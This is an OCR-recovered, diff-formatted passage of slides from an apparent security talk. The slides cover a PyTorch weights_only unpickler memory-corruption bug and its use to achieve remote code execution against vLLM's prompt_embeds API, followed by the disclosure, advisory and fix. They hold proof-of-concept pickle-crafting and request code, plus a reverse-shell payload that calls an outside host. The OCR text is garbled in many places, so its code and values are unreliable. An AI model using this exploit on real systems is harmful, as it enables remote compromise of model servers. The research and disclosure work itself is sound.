-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Q:
-2
 35:
-mo
 38:
 39:
-51%
-Sos
 123
 74:
 80:
@@ -1934,7 +1809,6 @@ Sos
 107:
 108:
 110:
-144%
 136:
 138:
 139:
@@ -1945,7 +1819,6 @@ Sos
 146:
 148:
 “Equivalent Pseudocode
-\x8@
 c
 PROTO
 GLOBAL
@@ -1953,7 +1826,6 @@ BINPUT
 MARK
 2
 ‘tor
-(7)
 ch._utils _rebuild_tensor_v2'
 MARK
 BINUNICODE 'storage'
@@ -1994,7 +1866,6 @@ BINPUT
 NEWFALS
 GLOBAL
 BINPUT
-EMPTY_T'
 REDUCE
 BINPUT
 TUPLE
@@ -2003,16 +1874,13 @@ REDUCE
 E
 UPLE
 10
-0
 10
 6
-aq
 7
 ‘collections OrderedDict'
 8
 9
 (MARK at 37)
-© OQIDQNQAQDKQIANKAQHAKRAQHAKRAOQ A KRAKAQ]&KQIANQ{X AH a
 BINPUT
 STOP
 11.
@@ -2021,11 +1889,9 @@ from collections import OrderedDict
 storage = persistent_load(('storage'
 torch.LongStorage,
 'Q',
-‘cpu'
 10) )
 result = torch._utils._rebuild_tensor_v2(
 storage,
-0,
 (10,),
 (1,),
 False,
@@ -2041,7 +1907,8 @@ OrderedDict(),
 
 58
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Quick Test v2 Function
@@ -2056,12 +1923,9 @@ storage_offset=1,
 size=(10,),
 stride=(1,),
 requires_grad=False,
-backward_hooks=OrderedDict()
 )
 print(tensor)
-tensor ([ Diy 3, 4,
 10, 134860703830768]
-0 O1
 58
 ```
 
@@ -2074,42 +1938,36 @@ Where to Patch?
 
 59
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @: \x8@ PROTO 2
 "Wh t Pp t h? 23 GLOBAL 'torch._utils _rebuild_tensor_v2'
-ere tO ratcns 35: q  BINPUT Q
-37: (MARK
+ere tO ratcns 35: q BINPUT Q
 38: ( MARK
 39: X BINUNICODE 'storage'
 51: q BINPUT 1
 53: c GLOBAL ‘torch LongStorage'
 72: q BINPUT 2
-: 74: X BINUNICODE '@!
 import torch 80: q BINPUT 3
-from collections import OrderedDict 7. . 4
 storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10]) 92: k BININT1 10
 tensor = torch._utils._rebuild_tensor_v2( 94: t TUPLE (MARK at 38)
 95: q BINPUT 5
 storage, 97: Q BINPERSID
-storage_offset=0 mores *_______.
 2 100: K BININT1 10
-[size=(10,), | 402:—\x85——>|TUPLE1
 stride=(1,), 103: q BINPUT 6
-Ste: KP BININTE
 requires_grad=False, 107: \x85 TUPLE1
 backward_hooks=OrderedDict() 108: q BINPUT 7
 110: \x89 NEWFALSE
 ) 111: ¢ GLOBAL ‘collections OrderedDict'
-print(tensor) TES ‘iG iad a
 138: ) EMPTY_TUPLE
 139: R REDUCE
 140: q BINPUT 9
 142: t TUPLE (MARK at 37)
-143: q  BINPUT 10
+143: q BINPUT 10
 145: R- REDUCE
-146: q  BINPUT 11
+146: q BINPUT 11
 148: . STOP
 59
 ```
@@ -2126,10 +1984,10 @@ print(tensor) TES ‘iG iad a
 
 60
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 72/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-ile .
 Failed
 1. Patch & Save
 patch = b'\x8@\x@2ctorch._utils...'
@@ -2138,39 +1996,30 @@ f.write(patch)
 os.system("zip -r tensor.pt tensor/")
 2. Load
 import torch rd
-torch. load("“tensor.pt")
 90000000: 8002 6374 6f72 6368 2e5f 7574 696c 730a ..ctorch._utils.
 00000010: 5f72 6562 7569 6c64 5f74 656e 736f 725f _rebuild_tensor_
 Q0000020: 7632 @a71 0028 2858 07 7374 6f72 v2.q.((X. stor
 @0000030: 6167 6571 0163 746f 7263 680a 4c6f 6e67 ageq.ctorch.Long
 00000040: 5374 6f72 6167 650a 7102 5801 30 Storage.q.X. e
 00000050: 7103 5803 63 7075 7104 4bQ@a 7471 q.X. cpuq.K.tq
-@0000060: @551 4401] 4bOa 8571 C64b 0185 7107 8963 .QK.K..q.K..q..c
 00000070: 636f 6c6c 6563 7469 6f6e 730a 4f72 6465 collections.Orde
 @0000080: 7265 6444 6963 740a 7108 2952 7109 7471 redDict.q.)Rq.tq
-20000090: @a52 71@b 2e -Rq..
 @ Why?
 /home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_subclasses/functional_tensor.py:279: UserWarning: Fail
 mpy' (Triggered internally at /pytorch/torch/csrc/utils/tensor_numpy.cpp:81. )
 cpu = _conversion_method_template(device=torch.device("cpu") )
 Traceback (most recent call last):
 File "/home/xuemo/pytorch-2.8.@/load.py", line 2, in <module>
-torch. load("tensor.pt")
 File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 1521, in load
 return _load(
-AAAAAA
 File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 2119, in _load
 result = unpickler.load()
-AAAAAAAAAAAAAAAA
 File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_weights_only_unpickler.py", line 409, in load
 result = func(xargs)
-AAAAAAAAAAA
 File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_utils.py", line 225, in _rebuild_tensor_v2
 tensor = _rebuild_tensor(storage, storage_offset, size, stride)
-DAAAAAAAAARAR AAA AA AAR AA AAA RAR AA AAA AAA AR AA AAA AAA AARADAA
 File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_utils.py", line 188, in _rebuild_tensor
 return t.set_(storage._untyped_storage, storage_offset, size, stride)
-AA AAA AAAAAA AAA AAA AAR AA AAAAAA AR AAA AAA AAA ARAAAAAAAAAAAAAAARARAAA
 RuntimeError: Trying to resize storage that is not resizable |
 60
 ```
@@ -2181,12 +2030,12 @@ RuntimeError: Trying to resize storage that is not resizable |
 
 61
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Root Cause
 t _ istent_load((‘st ' torch.Longst 1 persistent_load(saved_id) # serialization.py:2065
-re OE ‘yh tee : 10)). ongnmorages 2 | ‘ load_tensor(dtype=long, nbytes=80, ...) # serialization.py:2002
 result = torch. utils rebuild tensor v2( 3 | L zip_file.get_storage_from_record("data/0", 80) # serialization. py:2036
 (10,) 6 | L ¢10::Storage(
 (,), 7 | size=80,
@@ -2215,10 +2064,10 @@ OrderedDict(), 9 | allocator=nullptr,
 
 62
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-a e,e
 False Positive
 tensor = torch._utils._rebuild_tensor_v2( 2 _LegacyStorage.__new__() # storage.py:748
 3 L TypedStorage.__init__([1..10], dtype=long, device=cpu) # storage.py:839
@@ -2243,7 +2092,6 @@ if (old_data != nullptr && copy_capacity > 0) {
 memcpy (new_data.get(), old_data.get(), copy_capacity);
 }
 storage->set_data_ptr_noswap(std: :move(new_data) );
-storage->set_nbytes(size_bytes);
 ```
 
 ## Slide 63
@@ -2254,12 +2102,12 @@ storage->set_nbytes(size_bytes);
 
 63
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “First Attempt Failed
 \x8@ PROTO
-7 reg GLOBAL ee _rebuild_tensor_v2'
 35: q BINPUT (4)
 375 ( MARK
 38: ( MARK
@@ -2283,7 +2131,6 @@ storage->set_nbytes(size_bytes);
 107: \x85 TUPLE1
 108: q BINPUT 7
 110: \x89 NEWFALSE
-i Eas BR oy GLOBAL ‘collections OrderedDict'
 136: q BINPUT 8
 138: ) EMPTY_TUPLE
 139: R REDUCE
@@ -2300,7 +2147,6 @@ persistent_load(('storage'
 torch.LongStorage,
 result = torch.
 storage,
-Q,
 (10,),
 (1,),
 False,
@@ -2308,7 +2154,6 @@ OrderedDict(),
 _utils.
 _rebuild_tensor_v2(
 ® Not vulnerable
-‘@',
 "cpu!
 63
 10) )
@@ -2322,12 +2167,12 @@ _rebuild_tensor_v2(
 
 64
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “First Attempt Failed
 \x8@ PROTO
-7 reg GLOBAL ee _rebuild_tensor_v2'
 35: q BINPUT @
 B73 MARK
 38: ( MARK
@@ -2337,7 +2182,6 @@ B73 MARK
 72: q BINPUT , import torch
 Th: X BINUNICODE '@' from collections import OrderedDict
 eas net * storage = persistent_load(( ‘storage’
-82: X BINUNICODE 'cpu' ta ,
 90: q BINPUT 4 torch.LongStorage, '@', ‘cpu', 10))
 92: K BININT1 10 result = torch._utils._rebuild_tensor_v2(
 94: t TUPLE (MARK at 38) t
@@ -2369,7 +2213,8 @@ eas net * storage = persistent_load(( ‘storage’
 
 65
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 “A Quick Look at persistent load
@@ -2389,8 +2234,6 @@ OrderedDict(), nbytes = numel x torch._utils._element_size(dtype)
 ) typed_storage = load_tensor(
 dtype, nbytes, key,
 _maybe_decode_ascii( location)
-\(.venv) xuemo>xxd tensor/data/@ - vetyrn typed_storage
-00000000: @1 @2
 00000010: 03 04
 00000020: @5 06
 00000030: 07 68
@@ -2406,7 +2249,8 @@ _maybe_decode_ascii( location)
 
 66
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 “Try Again
@@ -2429,9 +2273,7 @@ numel, torch.UntypedStorage) *o
 ) 7194841895290213545,
 931
 pas -1
-typed_storage = torch.storage. TypedStorage( = 7526707116047695884
 S typed_storage = {TypedStorage: 20} 1\n 2\n 4423776321828644210
-wrap_storage=wrap_storage, os : - ; 3978707479627919394
 > S& device = {device} device(type='cpu') 3688834454662362930
 dtype=dtype,
 _internal=True,
@@ -2445,10 +2287,10 @@ _internal=True,
 
 67
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-"Why?
 storage = (
 zip_file.get_storage_from_record(name, numel,
 torch.UntypedStorage)
@@ -2457,22 +2299,16 @@ torch.LongStorage, ‘'@', ‘cpu', 20))
 ._typed_storage()
 ._untyped_storage)
 .def("get_st
-[]
 orage_from_record"
 (PyTorchStreamReader& self,
-const std;
 size_t numel,
 py::object data_type_obj) {
 [(.venv) xuemo>xxd tensor/data/®
-00000000: 61 @2
 at::DataPtr data(std::get<@>(self.getRecord(key))); @0000010: 63 04
-wae 00000020: @5 06
 //Missing Size Check!!! 00000030: 07 es
 c10::Storage storage(
 c1@::Storage::use_byte_size_t(),
 numel * elementSize(scalar_type),
-std: :move(data),
-/*xallocator=*/nullptr,
 /*resizable=*/false);
 })
 00000040:
@@ -2491,7 +2327,8 @@ std: :move(data),
 
 68
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Full Attack Flow
@@ -2549,11 +2386,11 @@ os.system("zip -r tensor.pt tensor/") return poc
 
 71
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "SETITEM & SETITEMS
-elif key[@] == SETITEM[Q@]:
 (v, k) = (self.stack.pop(), self.stack.pop() )
 self.stack[-1] [k] = v
 elif key[0] == SETITEMS[@]:
@@ -2579,7 +2416,8 @@ Bottom (Target Object) |_u--
 
 72
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Have a Try!
@@ -2588,7 +2426,6 @@ poc = generate_overflow_tensor_pid(overflow_length, 0)
 for i in range(overflow_length) :
 poc += MARK
 poc += BININT + pack("<i", i)
-poc+=BINFLOAT+pack(">d", @xaaaaaaaa)##overwrite
 poc+=SETITEMS
 poc += STOP
 with open("tensor/data.pkl","wb") as f:
@@ -2610,26 +2447,23 @@ Segmentation fault (core dumped)
 
 73
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Memory Structure
 c10::Storagelmp! (Memory Layout)
 Address’ slot[0] slot[1]
-c10::Tensorimpl
 Cleanup / Destructor Logic
-t') vptr refcount_ + weakcount_ STUD TT ar aa anne nnn mma nanan aan nanaaans
 : deleter_(ctx_.ptr);
 0x10 data_ptr_.ptr_.data_ ® data_ptr_.ptr_.ctx_.deleter o--- Pp:
 ! .
 1
 1
 1
-'
 1
 storage_
 // data_ == ctx_.ptr
-@x2® = =data_ptr_.ptr_.ctx_.ptr data_ptr_.device_ ees
 0x30 size_bytes_ [next fields omitted]
 1
 Target Real Memory (Data)
@@ -2642,7 +2476,8 @@ Target Real Memory (Data)
 
 74
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 70/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “A Simple Way to Achieve RCE
@@ -2650,7 +2485,6 @@ c10::Storagelmp! (Corrupted Memory Layout)
 of0:;Tensorimp! Address slot[0] slot[1] Hijacked Destructor Logic
 storage_ 0 vptr refcount_ + weakcount_ i. ie: '
 0x10 data_ptr_.ptr_.data_ ° data_ptr_.ptr_.ctx_.deleter e@-- -> system (eee pt r) :
-0x20 data_ptr_.ptr_.ctx_.ptr \data_pt r_.device_ : _// exec shell payload
 L 0x30 size_bytes_ [next™ fields omitted] J
 Target Real Memory overwritten Payload)
 "bash -i >&/dev/tcp/ip/port 0>&1\0"
@@ -2665,7 +2499,8 @@ Target Real Memory overwritten Payload)
 
 75
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 74/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “A Simple Way to Achieve RCE
@@ -2674,7 +2509,6 @@ c10::Storagelmp! (Corrupted Memory Layout)
 elec Address | stotlel stot(1] Hijacked Destructor Logic
 storage_ 0 vptr refcount_ + weakcount_ r
 0x10 data_ptr_.ptr_.data_ ° data_ptr_.ptr_.ctx_.deleter o-- -p system (eee pt r) F
-@x20 = data_ptr_.ptr_.ctx_.ptr S\ data_ptr_.device_ pf cs AN eee
 L 0x30 size_bytes_ [next™ fields omitted] J
 Target Real Memory overwritten Payload)
 "bash -i >&/dev/tcp/ip/port 0>&1\0"
@@ -2691,7 +2525,8 @@ No opcode for leak
 
 76
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “All Supported Opcodes
@@ -2712,8 +2547,6 @@ EMPTY_SET,
 EMPTY_TUPLE,
 GLOBAL,
 LONG1,
->
-=)
 No opcode for leak
 LONG_BINGET,
 LONG_BINPUT,
@@ -2754,20 +2587,18 @@ TUPLE3,
 
 https://salsa.debian.org/cpython-team/python3/-/blob/master/debian/rules
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-| | ares °
 % Amazing Feature
 Python Interpreter / python3 / Repository
 68 dpkg_buildflags = DEB_BUILD_MAINT_OPTIONS="hardening=-pie $(DPKG_OPTIMIZE)" dpkg-buildflags
-69 dpkg pieflags = DEB BUILD MAINT_OPTIONS="hardening=-pie $(DPKG_OPTIMIZE)"dpkg-buildflags
 70 |ifeq (,$(filter $(distrelease),stretch buster bullseye trusty xenial bionic focal impish) )
 71 with_nopie := yes
 72 dpkg_pieflags = DEB_BUILD_MAINT_OPTIONS="hardening=-pie $(DPKG_OPTIMIZE)" dpkg-buildflags
 73 endif
 Python Interpreter / python3 / Repository
-LLL
 1412 ifeq ($(with_nopie) , yes)
 © 1413 dh_installdirs -p$(p_npie) \
 1414 usr/bin
@@ -2786,14 +2617,14 @@ https://salsa.debian.org/cpython-team/python3/-/blob/master/debian/rules
 
 80
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 a
 c10::Tensorlmpl
 storage_
 Address
-(7)
 0x10
 0x20
 0x30
@@ -2802,13 +2633,10 @@ c10::Storagelmp! (Corrupted Memory Layout)
 slot[0] slot[1]
 vptr refcount_ + weakcount_
 data_ptr_.ptr_.data_ ° data_ptr_.ptr_.ctx_.deleter e-
-data_ptr_.ptr_.ctx_.ptr S\ data_ptr_.device_
 size_bytes_ [next™ fields omitted]
 Target Real Memory overwritten Payload)
-—
 "bash -i >&/dev/tcp/ip/port 0>&1\0"
 Hijacked Destructor Logic
-deletertetoi ptr
 system(ctx_.ptr);
 // exec shell payload
 80
@@ -2826,10 +2654,10 @@ system(ctx_.ptr);
 
 https://github.com/pytorch/pytorch/security/advisories/GHSA-63cw-57p8-fm3p
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-lu °
 Bypass Again!
 Loading a malicious PyTorch checkpoint with weights_only=True can result in Eait advisory
 arbitrary code execution
@@ -2855,7 +2683,6 @@ Impact
 An attacker who can convince a user to load a malicious checkpoint file may achieve arbitrary code execution in the context of the
 victim's process. No CWEs
 Credit Credits
-azraelxuemo Reporter) 4
 Ji'an Zhou
 https://github.com/pytorch/pytorch/security/advisories/GHSA-63cw-57p8-fm3p
 ```
@@ -2866,16 +2693,14 @@ https://github.com/pytorch/pytorch/security/advisories/GHSA-63cw-57p8-fm3p
 
 83
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Back to vLLM
-ON oaUuUB WYN
 POST /v1/completions { “prompt_embeds": "<base64>" }
 api_server.py:651 handler.create_completion(request, raw_request)
 request.prompt_embeds)
-renderer. py:254 self. load_prompt_embeds (prompt_embeds )
-renderer. py:148 torch. load(io.Bytes1I0(pybase64.b64decode(embed) ),
 weights_only=True)
 |— serving_completion.py:138 renderer.render_prompt_and_embeds(prompt_embeds=
 import requests
@@ -2887,7 +2712,6 @@ headers = {
 with open("tensor.pt","rb") as f:
 content=base64. b64encode(f.read()).decode()
 data = {
-"yrompt_embeds":content
 }
 requests.post(url, headers=headers, json=data)
 83
@@ -2927,20 +2751,18 @@ requests.post(url, headers=headers, json=data)
 
 88
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Inspiration
-LAucmue
 xuemo>curl http://localhost:8000/v1/completions -H "Content-Type: application/json" -d '{
 "model": "facebook/opt-125m",
 "prompta": "Hello, my name is",
 "max_tokens": 50
-ees
 {"error":{"message":"[{'type': 'value_error', 'loc': ('body',), 'msg': 'Value error, Either prompt or prompt_embeds mus
 t be provided and no = tioul is', 'max_tokens': 50
 }, 'ctx': {'error': |ValueError('Either prompt or prompt_embeds must be provided and non-empty.')}}]",|"type":"Bad Reques
-t", "param" :null, "code™:400}}xuemo>p
 88
 ```
 
@@ -2954,7 +2776,8 @@ t", "param" :null, "code™:400}}xuemo>p
 
 89
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Error Exfiltration
@@ -2967,11 +2790,8 @@ list_obj = self.stack[-1] if (
 if type(list_obj) is not list: and len(pid) > 0
 raise UnpicklingError( and torch,serialization._maybe_decode_ascii(pid[@]) != "storage"
 f"Can only append to lists,
-. yan raise UnpicklingError(
 but got {type(list_obj )} f"Only persistent_load of storage is allowed, but got
 ) {pid[@]}"
-list_obj.append(item) }
-self.append(self.persistent_load (pid) )
 89
 ```
 
@@ -2981,7 +2801,8 @@ self.append(self.persistent_load (pid) )
 
 90
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 “It Works!
@@ -2993,7 +2814,6 @@ and len(pid) > @
 and torch.serialization._maybe_decode_ascii(pid[@]) != "storage"
 raise UnpicklingError(
 f"Only_persistent_load of storage is allowed, but got
-{pid[0]}"
 )
 self.append(self.persistent_load(pid) )
 overflow_length = 256
@@ -3004,10 +2824,8 @@ with open("tensor/data.pkl","wb") as f:
 f.write(poc)
 os.system("zip -r tensor.pt tensor/")
 import torch
-torch. load("‘tensor.pt")
 Traceback (most recent call last):
 File "/home/xuemo/pytorch-2.8.0/load.py", line 2, in <module>
-torch. load("tensor.pt")
 File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 1
 529, in load
 raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
@@ -3034,7 +2852,8 @@ use case: WeightsUnpickler error: Only persistent_load of storage is allowed, bu
 
 91
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 import requests
@@ -3045,34 +2864,26 @@ headers = {
 "Works in vLLM!
 }
 with open("tensor.pt","rb") as f:
-content=base64. b64encode(f.read() ).decode()
 data = {
-“prompt_embeds": content
 }
 response = requests.post(url, headers=headers, json=data)
 print("Status Code:", response.status_code)
-ixuemo>python3 send. py print(response. text)
 Status Code: 500
 {"error":{"message":"Weights only load failed. In PyTorch 2.6, we changed the default value of the “weights_only* argum
 ent in “torch.load* from ‘False’ to ‘True’. Re-running “torch.load* with ‘weights_only* set to “False* will likely succ
 eed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.\nPlease file
 an_issue with the following so that we can make ‘weights only=True* compatible with your use case: WeightsUnpickler err
 or: Only persistent_load of storage is allowed, but got tensor([ a van
-Sp\n 4, 5s 6,\n Ts
 8, 9,\n 10, Q, 81,\n 14063427522076
 8, 235788384, @,\n Q, Q, 221,\n
 Abs 352951805673476, 82,\n 208, 140634025451320,
-235798472, \n Q, Q, @,\n 140634260153216,
-e, @,\n e, Q, @,\n
 Q, 235799328, 235799336, \n 235799336, Q, @,\
 @,\n Q, 208, 193,\n 235747728, 27
 66409169796213799, 235738272, \n Q, Q, 235799360, \n
 108083376, 140628152523088, @,\n Q, Q,
-@,\n Q, Q, 1,\n Q,
 Q, Q, 255, 1,\n 35295180567
 3476, 1271310385153, 225,\n 235799088, 140634275220912, 235738272, \n
 236341824, Q, 235799360, \n 108083376, 140627898250448,
-@,\n e, e, @,\n e,
 e, 5, 1,\n 352951805673476, 1271310385153, 3
 3,\n 236291120, 235738864, 224,\n 32, 154130528
 ; 235731424, \n 140627898261744, 225; 140634275220912, \n 235798832, 91
@@ -3084,12 +2895,12 @@ e, 5, 1,\n 352951805673476, 1271310385153, 3
 
 92
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 a
 © Bounty?
-Wo ovum
 Powers fast LLM endpoints in the cloud.
 $40,000
 92
@@ -3101,7 +2912,8 @@ $40,000
 
 93
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 a
@@ -3115,8 +2927,6 @@ lyou must have proper authorization from your employer to register and bind the 
 requirements, please review the full contest rules.
 Re: Some questions about the rules +
 zerodaycloud
-WA,
-Ca MRA RIFARN SUBIF
 Hello,
 Unfortunately we cannot accept submissions from residents of China due to internal policies and requirements.
 Best,
@@ -3130,13 +2940,13 @@ Zeroday Cloud Team
 
 94
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Report it to the Official Team
 vilm.entrypoints.openai.api_server RCE
 © Closed
-&
 azraelxuemo opened GHSA-v467-pj72-qc6v on Nov 4, 2025 - 18 comments
 Package Affected versions Patched versions
 @ vilm (pip), 0.11.0 None
@@ -3160,19 +2970,17 @@ Cv) @ ‘ussellb accepted this report on Nov 5, 2025
 
 95
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "@ Fixed Before the Competition
 Nov 19, 2025 v0.11.1
 rey khluu
-© vo.11.1 Hiahliah
-O- 4393684 © lgn'g ts
 Compare v This release incl
 def load_prompt_embeds (
 self,
 prompt_embeds: bytes | list[bytes],
-) -> list [EngineEmbedsPrompt] :
 if not self.model_config.enable_prompt_embeds:
 raise ValueError(
 "You must set ‘--enable-prompt-embeds~
@@ -3189,21 +2997,14 @@ map_location=torch.device("cpu"), 95
 
 96
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 75/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ‘Unpwned
 ZERODAY.CLOUD
-schedu
 DAY 2
-Lea | senate
-ee
-Tro | Semcememotemees |
-See [nem
-[ra Cems
 WV) Bohdan Ivanenko targeting vLLM
-= nore
-Tee | Amnesties |
 #6: Operation Cloudfall: Wrap-up
 SF cemacerrenertetenent wy Closing Ceremony and Winner Announcements
 96
@@ -3217,11 +3018,11 @@ SF cemacerrenertetenent wy Closing Ceremony and Winner Announcements
 
 https://github.com/pytorch/pytorch/pull/170085
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “PyTorch Fix
-Y torch/csrc/jit/python/init.cpp (Q) -?- +14-189888 & (Viewed CI
 Ea @@ -1613,10 +1613,23 @@ void initJITBindings(PyObject+ module) {
 1613 const std::string& key, 1613 const std::string& key,
 1614 size_t numel, 1614 size_t numel,
@@ -3238,17 +3039,12 @@ Ea @@ -1613,10 +1613,23 @@ void initJITBindings(PyObject+ module) {
 1623, + size,
 1624 + " bytes) does not match expected size (",
 1625 + numel * elementSize(scalar_type),
-1626 + “bytes =",
-1627 «+ numel,
-1628 4+ "elements * ",
 1629 + elementSize(scalar_type),
 1630 + " bytes/element) for dtype ",
 1631 + scalar_type);
-1632 +
 1620 c10::Storage storage( 1633 c10::Storage storage(
 1621 c10::Storage::use_byte_size_ t(), 1634 c10::Storage::use_byte_size_ t(),
 1622 numel * elementSize(scalar_type), 1635 numel * elementSize(scalar_type),
-https://github.com/pytorch/pytorch/pull/1 70085
 ```
 
 ## Slide 98
@@ -3259,11 +3055,11 @@ https://github.com/pytorch/pytorch/pull/1 70085
 
 https://github.com/pytorch/pytorch/pull/170085
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “PyTorch Fix
-torch/_weights_only_unpickler. py oO a
 @@ -468,9 +468,11 @@ def load(self):
 534
 535
@@ -3309,7 +3105,6 @@ elif key[@] in [BINGET[@], LONG_BINGET[@]]:
 540
 541
 542
